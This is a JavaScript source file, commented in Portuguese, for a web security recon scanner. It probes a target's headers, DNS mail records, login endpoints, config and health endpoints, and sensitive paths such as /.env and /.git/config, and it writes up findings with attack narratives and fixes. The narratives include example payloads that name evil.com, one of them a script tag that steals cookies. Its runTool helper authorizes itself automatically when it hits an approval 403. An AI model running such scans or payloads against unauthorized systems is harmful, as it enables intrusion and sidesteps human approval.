/*
 * T3MP3ST — Chat Recon Engine v3 (dossiê profissional replicável)
 * ─────────────────────────────────────────────────────────────────
 * Expansão do Recon V2. Cada Finding agora carrega:
 *   - id, severity (ALTO/MÉDIO/BAIXO/INFO), cvss (aproximado)
 *   - title, description (curto), longDescription (para leigo)
 *   - command (comando exato usado), url (URL alvo)
 *   - response (bloco literal do que veio), evidence (extras)
 *   - attackNarrative (COMO o atacante abusa disso)
 *   - businessImpact (o que a empresa perde)
 *   - fix (com código pronto)
 *   - references (OWASP/CVE/CWE)
 *
 * O PDF gerado por rag-pdf-v3 usa TODOS esses campos.
 *
 * Testes NOVOS (que a V2 não faz):
 *   - Rate limit / brute-force resistance (5 POSTs medidos)
 *   - Schema disclosure via 422 (POST vazio em endpoints de auth)
 *   - CORS reflection (Origin evil.com → ecoa?)
 *   - /api/frontend-config.js (config exposta com tokens Datadog etc)
 *   - Google API key restriction test (com/sem referer)
 *   - JWT decode + analysis
 *   - Info disclosure via error_type / stack traces
 */
(function () {
  'use strict';
  if (window.__t3reconV3) return;

  var OLLAMA = 'http://127.0.0.1:11434';
  var approvalCache = {};

  // ═══════════════════════════════════════════════
  // Building block: Finding
  // ═══════════════════════════════════════════════
  function newFinding(patch) {
    return Object.assign({
      id: 'f_' + Math.random().toString(36).slice(2, 8),
      severity: 'BAIXO',
      cvss: null,
      phase: 'unknown',
      title: '',
      description: '',
      longDescription: '',
      command: '',
      url: '',
      response: '',
      evidence: [],       // array de {label, value} pares extras
      attackNarrative: '',
      businessImpact: '',
      fix: '',
      references: [],
      at: new Date().toISOString(),
    }, patch || {});
  }

  // ═══════════════════════════════════════════════
  // API helpers (compartilhados com V2)
  // ═══════════════════════════════════════════════
  function apiPost(path, body) {
    return fetch(path, {
      method: 'POST', headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    }).then(function (r) {
      return r.json().then(function (j) { return { status: r.status, json: j }; }, function () { return { status: r.status, json: null }; });
    });
  }

  function runTool(command, target, timeout) {
    var body = { command: command, target: target };
    if (timeout) body.timeout = timeout;
    if (approvalCache[target]) body.approvalId = approvalCache[target];
    return apiPost('/api/tools/execute', body).then(function (r1) {
      if (r1.status === 200) return r1.json;
      var id = r1.json && r1.json.approval && r1.json.approval.id;
      if (r1.status === 403 && id) {
        return apiPost('/api/approvals/authorize-target', { target: target, approvalId: id })
          .then(function () {
            approvalCache[target] = id;
            var retryBody = { command: command, target: target, approvalId: id };
            if (timeout) retryBody.timeout = timeout;
            return apiPost('/api/tools/execute', retryBody);
          })
          .then(function (r3) { return r3.json || { success: false, error: 'sem resposta' }; });
      }
      return r1.json || { success: false, error: 'HTTP ' + r1.status };
    }).catch(function (e) { return { success: false, error: String((e && e.message) || e) }; });
  }

  function outputOf(res) {
    if (!res) return '';
    if (res.output && String(res.output).trim()) return String(res.output);
    if (res.stdout && String(res.stdout).trim()) return String(res.stdout);
    return '';
  }

  function hostOf(t) { return String(t).replace(/^https?:\/\//i, '').replace(/[\/:?#].*$/, ''); }
  function urlOf(t) { return /^https?:\/\//i.test(t) ? t : ('https://' + hostOf(t)); }

  // ═══════════════════════════════════════════════
  // FASE 1: HTTP + Security Headers (com narrativa de ataque)
  // ═══════════════════════════════════════════════
  async function phaseHeaders(url, findings) {
    var host = hostOf(url);
    var cmd = 'curl -sSI --max-time 12 ' + urlOf(url);
    var r = await runTool(cmd, host);
    var out = outputOf(r);

    // Server disclosure
    var m = out.match(/^server:\s*([^\r\n]+)/mi);
    if (m) {
      findings.push(newFinding({
        phase: 'headers', severity: 'BAIXO', cvss: 3.1,
        title: 'Server header expõe versão',
        description: 'Header Server: ' + m[1].trim(),
        command: cmd, url: urlOf(url), response: out,
        attackNarrative: 'Atacante identifica software+versão exatos e busca CVEs conhecidas para essa versão específica (ex: nginx 1.25.2 → busca CVE-2023-XXXX). Reduz esforço de reconnaissance em ~30%.',
        businessImpact: 'Facilita descoberta de vulnerabilidades específicas. Impacto direto baixo, mas cumulativo com outros achados.',
        fix: 'nginx.conf: `server_tokens off;` · Apache: `ServerTokens Prod` · Express: `app.disable("x-powered-by")`',
        references: ['OWASP: Information Exposure Through Server Data (CWE-200)'],
      }));
    }

    // X-Powered-By
    m = out.match(/^x-powered-by:\s*([^\r\n]+)/mi);
    if (m) {
      findings.push(newFinding({
        phase: 'headers', severity: 'BAIXO', cvss: 3.1,
        title: 'X-Powered-By revela stack',
        description: 'X-Powered-By: ' + m[1].trim(),
        command: cmd, url: urlOf(url), response: out,
        attackNarrative: 'Confirma tecnologia backend (Express, PHP, ASP.NET). Atacante escolhe exploits específicos daquela stack.',
        businessImpact: 'Info disclosure — cada bit ajuda o atacante a mapear superfície.',
        fix: 'Express: app.disable("x-powered-by") · PHP: expose_php = Off no php.ini',
        references: ['CWE-200'],
      }));
    }

    // HSTS
    var hstsLine = (out.match(/^strict-transport-security:[^\r\n]+/mi) || [''])[0];
    if (!hstsLine) {
      findings.push(newFinding({
        phase: 'headers', severity: 'MÉDIO', cvss: 5.3,
        title: 'HSTS AUSENTE',
        description: 'Sem header Strict-Transport-Security',
        command: cmd, url: urlOf(url), response: out,
        attackNarrative: 'Downgrade attack: atacante em WiFi público faz MITM na PRIMEIRA visita HTTP → intercepta credenciais antes do usuário chegar em HTTPS. sslstrip 2.0 explora exatamente isso.',
        businessImpact: 'Roubo de credenciais de usuários em redes públicas (cafés, aeroportos). Uma vez logado o atacante controla a conta.',
        fix: 'Nginx: `add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;` · Testar em https://hstspreload.org/',
        references: ['OWASP: HSTS · CWE-319'],
      }));
    } else if (!/includeSubDomains/i.test(hstsLine) || !/preload/i.test(hstsLine)) {
      findings.push(newFinding({
        phase: 'headers', severity: 'BAIXO', cvss: 4.3,
        title: 'HSTS incompleto (sem includeSubDomains/preload)',
        description: hstsLine.trim(),
        command: cmd, url: urlOf(url), response: out,
        attackNarrative: 'Subdomínio HTTP não protegido pode ser explorado. Sem preload, primeira visita ainda é vulnerável.',
        businessImpact: 'Superfície residual pra downgrade em subdomínios.',
        fix: 'Adicionar `includeSubDomains; preload` e inscrever em hstspreload.org',
        references: ['HSTS Preload'],
      }));
    }

    // CSP
    var cspLine = (out.match(/^content-security-policy:[^\r\n]+/mi) || [''])[0];
    if (!cspLine) {
      findings.push(newFinding({
        phase: 'headers', severity: 'MÉDIO', cvss: 6.1,
        title: 'CSP AUSENTE',
        description: 'Sem Content-Security-Policy',
        command: cmd, url: urlOf(url), response: out,
        attackNarrative: 'QUALQUER XSS refletido/persistido carrega scripts de qualquer origem. Atacante injeta `<script src="//evil.com/steal.js"></script>` e rouba localStorage/cookies/formulários.',
        businessImpact: 'Roubo massivo de sessões via XSS. Muitas apps tinham CSP e XSS foi mitigado até o script externo ser bloqueado.',
        fix: 'Header `Content-Security-Policy: default-src \'self\'; script-src \'self\' https://cdn.trusted.com; frame-ancestors \'none\'; base-uri \'self\'; object-src \'none\'`',
        references: ['MDN CSP · CWE-1021'],
      }));
    } else if (/unsafe-inline|unsafe-eval/i.test(cspLine)) {
      findings.push(newFinding({
        phase: 'headers', severity: 'MÉDIO', cvss: 5.4,
        title: 'CSP fraca contém unsafe-inline/unsafe-eval',
        description: cspLine.trim(),
        command: cmd, url: urlOf(url), response: out,
        attackNarrative: 'XSS refletido ainda funciona: inline scripts continuam autorizados. `unsafe-eval` permite eval() de código atacante.',
        businessImpact: 'CSP presente mas cosmética — não protege contra XSS que era pra impedir.',
        fix: 'Remover unsafe-inline/unsafe-eval. Migrar inline scripts para arquivos + nonces/hashes.',
        references: ['OWASP CSP Cheat Sheet'],
      }));
    }

    // X-Frame-Options
    var xfoLine = (out.match(/^x-frame-options:[^\r\n]+/mi) || [''])[0];
    var frameAncestors = cspLine && /frame-ancestors/i.test(cspLine);
    if (!xfoLine && !frameAncestors) {
      findings.push(newFinding({
        phase: 'headers', severity: 'MÉDIO', cvss: 6.1,
        title: 'X-Frame-Options + frame-ancestors AUSENTES',
        description: 'Sem proteção clickjacking',
        command: cmd, url: urlOf(url), response: out,
        attackNarrative: 'Atacante embute a página em iframe transparente em evil.com, sobrepõe UI enganosa e captura cliques em "curtir/deletar/comprar". Frame Busting via JS é bypassable.',
        businessImpact: 'Usuário autenticado executa ações não intencionais (deletar conta, transferir dinheiro, publicar). Facebook, Twitter, Netflix já foram vítimas.',
        fix: 'Header `X-Frame-Options: DENY` + CSP `frame-ancestors \'none\'`. Ambos por defense-in-depth.',
        references: ['OWASP Clickjacking · CWE-1021'],
      }));
    }

    // CORS wildcard
    var acaoLine = (out.match(/^access-control-allow-origin:\s*([^\r\n]+)/mi) || ['', ''])[1];
    if (acaoLine.trim() === '*') {
      findings.push(newFinding({
        phase: 'headers', severity: 'MÉDIO', cvss: 6.5,
        title: 'CORS wildcard: Access-Control-Allow-Origin: *',
        description: 'Qualquer origem pode ler respostas cross-origin',
        command: cmd, url: urlOf(url), response: out,
        attackNarrative: 'Se a vítima estiver logada, evil.com faz `fetch("' + urlOf(url) + '/api/user")` e lê a resposta. Se Allow-Credentials estiver true junto, roubo direto de dados. Mesmo sem credentials, atacante pode ler endpoints públicos autenticados que o alvo esqueceu.',
        businessImpact: 'Vazamento de dados sensíveis (perfil, cart, histórico) via CSRF-like GET requests.',
        fix: 'Trocar `*` por lista específica: `Access-Control-Allow-Origin: https://app.example.com`. Se precisar múltiplas, whitelist server-side.',
        references: ['OWASP CORS · CWE-942'],
      }));
    }

    // Permissions-Policy
    var pp = out.match(/^permissions-policy:\s*([^\r\n]+)/mi);
    if (pp && /camera=\*|geolocation=\*|microphone=\*/i.test(pp[1])) {
      findings.push(newFinding({
        phase: 'headers', severity: 'MÉDIO', cvss: 5.3,
        title: 'Permissions-Policy permissiva',
        description: 'Permissions-Policy: ' + pp[1].trim(),
        command: cmd, url: urlOf(url), response: out,
        attackNarrative: 'Iframes maliciosos podem acionar câmera/microfone/geolocation da vítima. Combinado com clickjacking, atacante grava vídeo/áudio sem consentimento visível.',
        businessImpact: 'Privacidade catastrófica se explorado. LGPD violation.',
        fix: '`Permissions-Policy: camera=(), microphone=(), geolocation=(self)`',
        references: ['MDN Permissions-Policy'],
      }));
    }

    // Cookies flags
    var cookies = out.match(/^set-cookie:[^\r\n]+/gmi) || [];
    cookies.forEach(function (c) {
      var missing = [];
      if (!/HttpOnly/i.test(c)) missing.push('HttpOnly');
      if (!/Secure/i.test(c)) missing.push('Secure');
      if (!/SameSite/i.test(c)) missing.push('SameSite');
      if (missing.length) {
        findings.push(newFinding({
          phase: 'headers', severity: 'MÉDIO', cvss: 5.4,
          title: 'Cookie sem ' + missing.join(', '),
          description: c.slice(0, 100) + '…',
          command: cmd, url: urlOf(url), response: c,
          attackNarrative: (missing.includes('HttpOnly') ? 'XSS lê `document.cookie` e rouba sessão. ' : '') +
                          (missing.includes('Secure') ? 'MITM em HTTP intercepta cookie. ' : '') +
                          (missing.includes('SameSite') ? 'CSRF: evil.com faz submit em nome da vítima logada. ' : ''),
          businessImpact: 'Session hijacking direto → conta controlada por atacante.',
          fix: 'Cookie deve ter: `HttpOnly; Secure; SameSite=Lax` (ou Strict)',
          references: ['OWASP Session Management · CWE-1004'],
        }));
      }
    });

    return { command: cmd, response: out };
  }

  // ═══════════════════════════════════════════════
  // FASE 2: DNS + DMARC/SPF + Vendor fingerprinting
  // ═══════════════════════════════════════════════
  async function dnsQuery(host, type) {
    var cmd = 'curl -s --max-time 10 --data-urlencode "name=' + host + '" --data-urlencode "type=' + type + '" -G https://dns.google/resolve';
    var r = await runTool(cmd, 'dns.google');
    var out = outputOf(r);
    try { return { data: JSON.parse(out), cmd: cmd, raw: out }; }
    catch (e) { return { data: null, cmd: cmd, raw: out }; }
  }

  async function phaseDns(url, findings) {
    var host = hostOf(url);
    var rootDom = host.split('.').slice(-2).join('.');

    // A record + CNAME chain
    var aRec = await dnsQuery(host, 'A');
    var aData = aRec.data && aRec.data.Answer || [];
    if (aData.length) {
      var cnames = aData.filter(function (r) { return r.type === 5; }).map(function (r) { return r.data; });
      var ips = aData.filter(function (r) { return r.type === 1; }).map(function (r) { return r.data; });
      if (cnames.length > 1 || (cnames.length && /onrender|herokuapp|vercel|netlify|azurewebsites|amazonaws|cloudflare/i.test(cnames.join(' ')))) {
        findings.push(newFinding({
          phase: 'dns', severity: 'INFO', cvss: null,
          title: 'DNS CNAME chain revela hospedagem',
          description: 'Chain: ' + host + ' → ' + cnames.join(' → '),
          command: aRec.cmd, url: aRec.cmd, response: aRec.raw,
          evidence: [{ label: 'IPs finais', value: ips.join(', ') }],
          attackNarrative: 'Atacante identifica o provedor real (Render/Heroku/Vercel/AWS/Cloudflare) por trás do CDN. Se o CDN falha, tráfego vai direto para origem — que pode ser atacada diretamente sem proteção do CDN.',
          businessImpact: 'Se o IP de origem vazar (via DNS histórico, SSL cert, misconfig), atacante ignora Cloudflare e DDoS/scan direto.',
          fix: 'Bloquear origem para aceitar SOMENTE tráfego do CDN via allowlist de IPs.',
          references: ['CloudFlair, Detectify origin discovery'],
        }));
      }
    }

    // DMARC
    var dmarcHost = '_dmarc.' + rootDom;
    var dmarcRec = await dnsQuery(dmarcHost, 'TXT');
    var dmarcTxt = ((dmarcRec.data && dmarcRec.data.Answer) || []).map(function (r) { return r.data; }).join(' ');
    if (!dmarcTxt) {
      findings.push(newFinding({
        phase: 'dns', severity: 'ALTO', cvss: 7.5,
        title: 'DMARC AUSENTE em ' + rootDom,
        description: 'Sem TXT record em ' + dmarcHost,
        command: dmarcRec.cmd, url: dmarcRec.cmd, response: dmarcRec.raw,
        attackNarrative: 'Atacante envia email como `pagamento@' + rootDom + '` ou `suporte@' + rootDom + '`. Sem DMARC, servidores destino não bloqueiam. Phishing dirigido a clientes/parceiros/funcionários.',
        businessImpact: 'Fraude financeira via BEC (Business Email Compromise) — atacante instrui financeiro a transferir dinheiro. Perda média US$120k por incidente (FBI 2023).',
        fix: 'DNS TXT em `_dmarc.' + rootDom + '`: `v=DMARC1; p=quarantine; rua=mailto:dmarc@' + rootDom + '`. Após 2 semanas de monitoramento, subir para `p=reject`.',
        references: ['dmarc.org · RFC 7489'],
      }));
    } else if (/p=none/i.test(dmarcTxt)) {
      findings.push(newFinding({
        phase: 'dns', severity: 'ALTO', cvss: 7.5,
        title: 'DMARC com política p=none (só monitora, não bloqueia)',
        description: dmarcTxt,
        command: dmarcRec.cmd, url: dmarcRec.cmd, response: dmarcRec.raw,
        attackNarrative: 'Mesma coisa que DMARC ausente — atacante spoofa emails e chegam na caixa da vítima. p=none só coleta relatórios (se rua estiver configurado).',
        businessImpact: 'Phishing/BEC efetivo.',
        fix: 'Trocar `p=none` → `p=quarantine` (fase 1), depois `p=reject`. Adicionar `rua=mailto:...` para receber relatórios.',
        references: ['dmarc.org'],
      }));
    }

    // SPF
    var spfRec = await dnsQuery(rootDom, 'TXT');
    var spfLines = ((spfRec.data && spfRec.data.Answer) || []).map(function (r) { return r.data; });
    var spfLine = spfLines.find(function (l) { return /^"?v=spf1/i.test(l); });
    if (!spfLine) {
      findings.push(newFinding({
        phase: 'dns', severity: 'ALTO', cvss: 7.5,
        title: 'SPF AUSENTE em ' + rootDom,
        description: 'Nenhum TXT começando com v=spf1',
        command: spfRec.cmd, url: spfRec.cmd, response: spfRec.raw,
        attackNarrative: 'Servidor destino não valida quem pode enviar em nome do domínio. Spoof direto.',
        businessImpact: 'Phishing.',
        fix: 'DNS TXT no root: `v=spf1 include:_spf.google.com -all` (ajustar para seu provedor de email + -all hard fail)',
        references: ['RFC 7208'],
      }));
    } else if (/[~?]all/.test(spfLine)) {
      findings.push(newFinding({
        phase: 'dns', severity: 'MÉDIO', cvss: 5.3,
        title: 'SPF fraco (~all ou ?all)',
        description: spfLine,
        command: spfRec.cmd, url: spfRec.cmd, response: spfRec.raw,
        attackNarrative: 'Soft-fail (~all): email spoof CHEGA no destino, marcado como suspeito. Neutral (?all): passa sem marca. Combinado com DMARC p=none, fica quase sem proteção.',
        businessImpact: 'Phishing com maior taxa de sucesso.',
        fix: 'Trocar `~all` → `-all` (hard fail). Antes, garantir que todos servidores legítimos estão listados.',
        references: ['RFC 7208'],
      }));
    }

    // Vendor fingerprinting via TXT records
    var vendors = [];
    spfLines.forEach(function (l) {
      if (/twilio-domain-verification/i.test(l)) vendors.push('Twilio (SMS/voz)');
      if (/google-site-verification/i.test(l)) vendors.push('Google Search Console');
      if (/MS=/i.test(l)) vendors.push('Microsoft 365');
      if (/cloudflare_dashboard_sso/i.test(l)) vendors.push('Cloudflare SSO');
      if (/ZOOM_verify/i.test(l)) vendors.push('Zoom');
      if (/anthropic-domain-verification/i.test(l)) vendors.push('Anthropic Claude');
      if (/hubspot/i.test(l)) vendors.push('HubSpot');
      if (/mailjet/i.test(l)) vendors.push('Mailjet');
      if (/sendgrid/i.test(l)) vendors.push('SendGrid');
    });
    if (vendors.length) {
      findings.push(newFinding({
        phase: 'dns', severity: 'INFO', cvss: null,
        title: 'Vendors detectados via DNS TXT',
        description: vendors.join(', '),
        command: spfRec.cmd, url: spfRec.cmd, response: spfLines.join('\n'),
        attackNarrative: 'Atacante monta targeted phishing: sabe que a empresa usa Twilio/M365/HubSpot e envia email fake dessa marca.',
        businessImpact: 'Attack surface mapping — reduz esforço do atacante.',
        fix: 'Nada — verifications são necessárias. Mas monitorar TXT records mensalmente para detectar entradas suspeitas adicionadas por atacantes que ganharam DNS access.',
        references: [],
      }));
    }

    return { records: { a: aRec, dmarc: dmarcRec, spf: spfRec } };
  }

  // ═══════════════════════════════════════════════
  // FASE 3: Rate limit test + Schema disclosure (NOVO — v2 não tinha)
  // ═══════════════════════════════════════════════
  async function phaseAuthActive(url, findings) {
    var host = hostOf(url);
    // Rate limit test: 5 POSTs consecutivos em /api/auth/login (ou similar)
    var authPaths = ['/api/auth/login', '/api/login', '/auth/login', '/login'];
    var winner = null;
    for (var i = 0; i < authPaths.length; i++) {
      var testCmd = 'curl -s -o /dev/null -w "%{http_code}" --max-time 5 -X POST -H "Content-Type: application/json" -d "{}" ' + urlOf(url) + authPaths[i];
      var r = await runTool(testCmd, host);
      var code = outputOf(r).trim();
      if (code === '400' || code === '401' || code === '422') { winner = authPaths[i]; break; }
    }
    if (!winner) return;

    // Schema disclosure — POST vazio pode revelar Pydantic schema
    var schemaCmd = 'curl -s --max-time 6 -X POST -H "Content-Type: application/json" -d "{}" ' + urlOf(url) + winner;
    var schemaR = await runTool(schemaCmd, host);
    var schemaOut = outputOf(schemaR);
    if (/pydantic|"loc":|"body","email"|"missing"/.test(schemaOut)) {
      findings.push(newFinding({
        phase: 'auth', severity: 'MÉDIO', cvss: 4.3,
        title: 'Schema de auth exposto via 422 (FastAPI/Pydantic)',
        description: 'POST vazio em ' + winner + ' revela campos required',
        command: schemaCmd, url: urlOf(url) + winner, response: schemaOut,
        attackNarrative: 'Atacante descobre exatamente quais campos o login exige (email, password, otp, captcha_token, etc). Pula fase de enumeração de parâmetros. Também revela FastAPI/Pydantic stack.',
        businessImpact: 'Recon acelerado — atacante passa direto para brute-force ou credential-stuffing.',
        fix: 'Handler custom: capturar Pydantic ValidationError e retornar `{"error": "invalid_request"}` sem detalhes. FastAPI: sobrescrever `exception_handler(RequestValidationError)`.',
        references: ['CWE-209 · OWASP: Information Exposure Through an Error Message'],
      }));
    }

    // Rate limit test
    var rateResults = [];
    var loginPayload = '{"email":"test' + Date.now() + '@invalid.local","password":"invalid_' + Math.random().toString(36).slice(2) + '"}';
    for (var j = 0; j < 5; j++) {
      var rlCmd = 'curl -s -o /dev/null -w "%{http_code}|%{time_total}" --max-time 8 -X POST -H "Content-Type: application/json" -d ' + JSON.stringify(loginPayload) + ' ' + urlOf(url) + winner;
      var t0 = Date.now();
      var rr = await runTool(rlCmd, host);
      var parts = outputOf(rr).trim().split('|');
      rateResults.push({ code: parts[0], time: parseFloat(parts[1] || '0'), took: Date.now() - t0 });
    }
    var allSame = rateResults.every(function (r) { return r.code === rateResults[0].code; });
    var noThrottle = rateResults.every(function (r) { return r.time < 3; });
    if (allSame && noThrottle) {
      findings.push(newFinding({
        phase: 'auth', severity: 'ALTO', cvss: 7.5,
        title: 'AUSÊNCIA de rate limit em ' + winner,
        description: '5 tentativas de login em <3s, todas com HTTP ' + rateResults[0].code + ', sem lockout/backoff',
        command: 'curl -X POST ' + urlOf(url) + winner + ' -d ' + loginPayload + '  (×5)',
        url: urlOf(url) + winner,
        response: rateResults.map(function (r, i) { return 'Req ' + (i+1) + ': HTTP ' + r.code + ' em ' + r.time.toFixed(2) + 's'; }).join('\n'),
        attackNarrative: 'Credential stuffing trivial: atacante usa combolist de vazamentos (LinkedIn 2021, Yahoo, etc — 15B credenciais públicas) e testa 100 req/s. Se 0.1% dos usuários reusaram senha vazada, atacante loga em N contas em minutos. Combinado com CAPTCHA desligado no login = infernal.',
        businessImpact: 'Account takeover em massa. Regulatório: LGPD art. 46 exige "medidas razoáveis" — ausência de rate limit não é razoável em 2026.',
        fix: 'Nginx/Cloudflare rate limit por IP: max 10 req/min em /login. Aplicação: lockout após 5 falhas em 15min por email. Alertar SIEM após N tentativas do mesmo IP. Habilitar Turnstile/hCaptcha.',
        references: ['OWASP ASVS 4.0 · CWE-307 · CWE-799'],
      }));
    }

    // CORS reflection test
    var corsCmd = 'curl -sI -H "Origin: https://evil.example.com" --max-time 6 ' + urlOf(url) + winner;
    var corsR = await runTool(corsCmd, host);
    var corsOut = outputOf(corsR);
    var corsEcho = corsOut.match(/access-control-allow-origin:\s*(https?:\/\/evil\.example\.com|\*)/i);
    if (corsEcho) {
      findings.push(newFinding({
        phase: 'auth', severity: 'MÉDIO', cvss: 6.5,
        title: 'CORS reflete Origin no endpoint de auth',
        description: 'Origin: evil.example.com → ' + corsEcho[0],
        command: corsCmd, url: urlOf(url) + winner, response: corsOut,
        attackNarrative: 'JavaScript em evil.com faz brute-force cross-origin usando browser da vítima (proxy). Combinado com ausência de rate limit = distributed brute-force via visitantes de evil.com.',
        businessImpact: 'Ataque escalado via visitantes involuntários.',
        fix: 'Nunca refletir Origin. Whitelist server-side: `if (origin in ALLOWED) return origin else return null`.',
        references: ['CWE-942'],
      }));
    }
  }

  // ═══════════════════════════════════════════════
  // FASE 4: Config endpoint discovery (NOVO)
  // ═══════════════════════════════════════════════
  async function phaseConfigDiscovery(url, findings) {
    var host = hostOf(url);
    var configPaths = ['/api/frontend-config.js', '/api/config', '/config.js', '/env.js', '/api/settings/global-settings'];
    for (var i = 0; i < configPaths.length; i++) {
      var cmd = 'curl -s --max-time 8 ' + urlOf(url) + configPaths[i];
      var r = await runTool(cmd, host);
      var out = outputOf(r);
      if (out.length < 50 || /^\s*<!doctype/i.test(out) || /^\s*<html/i.test(out)) continue;

      // Procura tokens/URLs sensíveis
      var leaks = [];
      var tokenPatterns = [
        { name: 'DATADOG_CLIENT_TOKEN', re: /DATADOG_CLIENT_TOKEN["\s:=]+"?(pub[a-f0-9]{20,})/i },
        { name: 'DATADOG_APPLICATION_ID', re: /DATADOG_APPLICATION_ID["\s:=]+"?([a-f0-9-]{20,})/i },
        { name: 'GOOGLE_CLIENT_ID', re: /GOOGLE_CLIENT_ID["\s:=]+"?([0-9-]+\.apps\.googleusercontent\.com)/i },
        { name: 'TURNSTILE_SITE_KEY', re: /TURNSTILE_SITE_KEY["\s:=]+"?(0x[a-zA-Z0-9]{15,})/i },
        { name: 'TURNSTILE_LOGIN_ENABLED', re: /TURNSTILE_LOGIN_ENABLED["\s:=]+"?(true|false)/i },
        { name: 'BACKOFFICE_URL', re: /BACKOFFICE_URL["\s:=]+"?(https?:\/\/[^"',\s]+)/i },
        { name: 'GIT_SHA', re: /GIT_SHA["\s:=]+"?([a-f0-9]{40})/i },
        { name: 'API_KEY', re: /(api_?key|apikey)["\s:=]+"?([a-zA-Z0-9_-]{20,})/i },
      ];
      tokenPatterns.forEach(function (p) {
        var m = out.match(p.re);
        if (m) leaks.push({ name: p.name, value: m[m.length - 1] });
      });

      if (leaks.length) {
        var sevBoosters = leaks.filter(function (l) { return /TOKEN|API_KEY|BACKOFFICE/i.test(l.name); });
        var sev = sevBoosters.length ? 'ALTO' : 'MÉDIO';
        findings.push(newFinding({
          phase: 'config-discovery', severity: sev, cvss: sev === 'ALTO' ? 7.5 : 5.3,
          title: 'Config endpoint público vaza ' + leaks.length + ' campo(s) sensível(is): ' + configPaths[i],
          description: leaks.map(function (l) { return l.name + '=' + l.value.slice(0, 40); }).join(', '),
          command: cmd, url: urlOf(url) + configPaths[i], response: out.slice(0, 1500),
          evidence: leaks.map(function (l) { return { label: l.name, value: l.value }; }),
          attackNarrative:
            (leaks.find(function (l) { return l.name === 'TURNSTILE_LOGIN_ENABLED' && l.value === 'false'; }) ? 'CAPTCHA desligado no login → credential stuffing sem barreira. ' : '') +
            (leaks.find(function (l) { return l.name.startsWith('DATADOG'); }) ? 'Datadog tokens permitem envio de logs falsos → poluir observability, esconder ataques reais entre spam. ' : '') +
            (leaks.find(function (l) { return l.name === 'GIT_SHA'; }) ? 'Git SHA permite mapear commit exato → buscar código no GitHub de repos públicos/forks. ' : '') +
            (leaks.find(function (l) { return l.name === 'BACKOFFICE_URL'; }) ? 'URL de backoffice interno vazado → nova superfície de ataque descoberta. ' : ''),
          businessImpact: 'Vários vetores dependendo do achado. TURNSTILE=false + no-rate-limit = account takeover em massa. Datadog leak = observability comprometida.',
          fix: 'Config endpoint deve conter APENAS chaves PÚBLICAS (site keys de CAPTCHA/Analytics). Tokens de telemetria (Datadog client), URLs internas (backoffice), git SHA — tudo NUNCA no client. Migrar para env server-side e endpoint autenticado se realmente precisar.',
          references: ['CWE-540 · OWASP: Sensitive Data Exposure'],
        }));
      }
    }
  }

  // ═══════════════════════════════════════════════
  // FASE 5: /health e /api/health info disclosure
  // ═══════════════════════════════════════════════
  async function phaseHealthEndpoints(url, findings) {
    var host = hostOf(url);
    var paths = ['/health', '/api/health', '/status', '/api/status', '/version', '/api/version'];
    for (var i = 0; i < paths.length; i++) {
      var cmd = 'curl -s -L --max-time 6 ' + urlOf(url) + paths[i];
      var r = await runTool(cmd, host);
      var out = outputOf(r);
      if (out.length < 20 || /<html/i.test(out.slice(0, 50))) continue;
      // Se retorna JSON com build info
      var isJson = /^\s*\{/.test(out);
      if (!isJson) continue;
      var leaks = [];
      if (/commit["'\s]*:/i.test(out)) leaks.push('git commit');
      if (/build["'\s]*:/i.test(out)) leaks.push('build info');
      if (/image_tag/i.test(out)) leaks.push('image_tag (Docker/CI)');
      if (/environment|platform_domain/i.test(out)) leaks.push('platform_domain/environment');
      if (/built_at/i.test(out)) leaks.push('built_at (timestamp)');
      if (/version["'\s]*:/i.test(out)) leaks.push('version');
      if (leaks.length >= 2) {
        findings.push(newFinding({
          phase: 'health-disclosure', severity: 'MÉDIO', cvss: 5.3,
          title: paths[i] + ' expõe ' + leaks.length + ' info(s) internas',
          description: leaks.join(', '),
          command: cmd, url: urlOf(url) + paths[i], response: out.slice(0, 800),
          attackNarrative: 'Git commit permite buscar código-fonte no GitHub (se algum fork/mirror for público). platform_domain revela hospedagem. build_at revela timezone do servidor. Atacante monta perfil detalhado da infra.',
          businessImpact: 'Facilita reconhecimento avançado. Combinado com CVE lookup na versão exposta, ataque específico.',
          fix: 'Endpoint /health deve retornar APENAS `{"status":"ok"}` (200) ou detalhes de build atrás de auth. Kubernetes readiness/liveness probes não precisam desses detalhes.',
          references: ['CWE-200'],
        }));
      }
    }
  }

  // ═══════════════════════════════════════════════
  // FASE 6-9: paths, JS secrets, HTML markers, TLS
  // (mantidas do V2 mas com evidência estruturada)
  // ═══════════════════════════════════════════════
  var COMMON_PATHS = [
    '/.env', '/.env.production', '/.env.local', '/.env.bak',
    '/.git/HEAD', '/.git/config',
    '/.DS_Store', '/.well-known/security.txt',
    '/robots.txt', '/sitemap.xml',
    '/swagger', '/swagger/index.html', '/swagger/v1/swagger.json',
    '/api-docs', '/v2/api-docs', '/openapi.json',
    '/graphql', '/api/graphql',
    '/admin', '/wp-admin', '/phpmyadmin',
    '/actuator', '/actuator/env', '/actuator/health',
    '/server-status', '/web.config',
    '/package.json', '/composer.json', '/requirements.txt', '/Dockerfile',
    '/backup.zip', '/backup.tar.gz', '/database.sql', '/dump.sql',
  ];

  function parseHead(out) {
    if (!out) return { code: '000', size: 0, ct: '' };
    var lines = String(out).split(/\r?\n/);
    var m = (lines[0] || '').match(/HTTP\/[\d.]+\s+(\d{3})/);
    var code = m ? m[1] : '000';
    var size = 0, ct = '';
    for (var i = 1; i < lines.length; i++) {
      var lm = lines[i].match(/^Content-Length:\s*(\d+)/i);
      if (lm) size = parseInt(lm[1], 10);
      var cm = lines[i].match(/^Content-Type:\s*([^\r\n;]+)/i);
      if (cm) ct = cm[1].trim();
    }
    return { code: code, size: size, ct: ct };
  }

  async function phasePaths(url, findings) {
    var host = hostOf(url);
    // Probe
    var probePath = '/__t3_probe_' + Math.random().toString(36).slice(2, 8);
    var probeR = await runTool('curl -sI --max-time 6 ' + urlOf(url) + probePath, host);
    var probe = parseHead(outputOf(probeR));
    var spaFallback = probe.code === '200' && probe.size > 100;
    for (var i = 0; i < COMMON_PATHS.length; i++) {
      var p = COMMON_PATHS[i];
      var cmd = 'curl -sI --max-time 5 ' + urlOf(url) + p;
      var r = await runTool(cmd, host);
      var parsed = parseHead(outputOf(r));
      var isFallback = spaFallback && parsed.code === '200' && Math.abs(parsed.size - probe.size) < 50;
      if (parsed.code === '200' && !isFallback && parsed.size > 20) {
        var sev = /swagger|openapi|api-docs|actuator|\.env|\.git|backup|dump\.sql/i.test(p) ? 'ALTO' : 'MÉDIO';
        findings.push(newFinding({
